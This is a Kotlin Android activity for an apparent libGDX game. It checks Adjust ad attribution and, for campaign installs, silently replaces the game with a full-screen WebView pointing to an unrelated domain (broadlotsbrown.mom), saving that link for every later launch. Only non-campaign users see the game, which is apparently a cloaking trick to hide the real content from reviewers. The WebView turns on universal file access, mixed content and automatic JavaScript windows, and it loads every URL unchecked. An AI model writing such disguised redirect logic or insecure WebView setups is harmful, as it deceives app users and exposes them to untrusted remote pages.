package com.proccaptald.proffesionalestic

import android.content.Context
import android.content.SharedPreferences
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustAttribution
import com.adjust.sdk.OnAttributionReadListener
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.proccaptald.proffesionalestic.databinding.ActivityGameBinding
import com.proccaptald.proffesionalestic.game.screens.MainScreen
import com.proccaptald.proffesionalestic.util.OneTime
import com.proccaptald.proffesionalestic.util.isNotNullAndEmptyAndText
import com.proccaptald.proffesionalestic.util.isNullOrText
import com.proccaptald.proffesionalestic.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlin.system.exitProcess

class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding
    lateinit var sharedPreferences: SharedPreferences

    val screenTypeFlow = MutableStateFlow(ScreenType.None)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initialize()

        sharedPreferences = getSharedPreferences("MAIN_SHARED", Context.MODE_PRIVATE)
        initWeb()

        val sharedValue = sharedPreferences.getString("value", "empty")

        try {
            if (sharedValue.isNullOrText("empty")) Adjust.getAttribution(AdjustReadListener()) else showUrl(sharedValue!!)
        } catch (e: Exception) {
            log("error: ${e.message}")
            screenTypeFlow.value = ScreenType.Game
        }
    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Logic ----------------------------------------------------------------------------------

    private fun initWeb() {
        binding.webView.apply {
            settings.apply {
                allowFileAccessFromFileURLs = true
                allowContentAccess = true
                javaScriptEnabled = listOf(true).first()
                javaScriptCanOpenWindowsAutomatically = true
                allowFileAccess = true
                mixedContentMode = 0
                useWideViewPort = true
                allowUniversalAccessFromFileURLs = true
                loadWithOverviewMode = true
                domStorageEnabled = true
                databaseEnabled = true
            }

            webViewClient = WebClient()
        }
    }

    private fun showUrl(url: String) {
        requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

        binding.webView.apply {
            isVisible = true
            loadUrl(url)
        }
    }

    private inner class AdjustReadListener : OnAttributionReadListener {
        override fun onAttributionRead(attribution: AdjustAttribution?) {
            val clickLabel = attribution?.clickLabel
            val campaign   = attribution?.campaign

            log("result $attribution | $clickLabel | $campaign")

            if (attribution != null) {
                if (campaign.isNotNullAndEmptyAndText("None")) {
                    val link = "https://broadlotsbrown.mom/ZM5w8xsH?procapcam=$campaign&procapla=$clickLabel"
                    log("link = $link")
                    sharedPreferences.edit().putString("value", link).apply()
                    showUrl(link)
                } else screenTypeFlow.value = ScreenType.Game
            } else screenTypeFlow.value = ScreenType.Game
        }
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            return false
        }
    }

    enum class ScreenType {
        None, Game
    }

}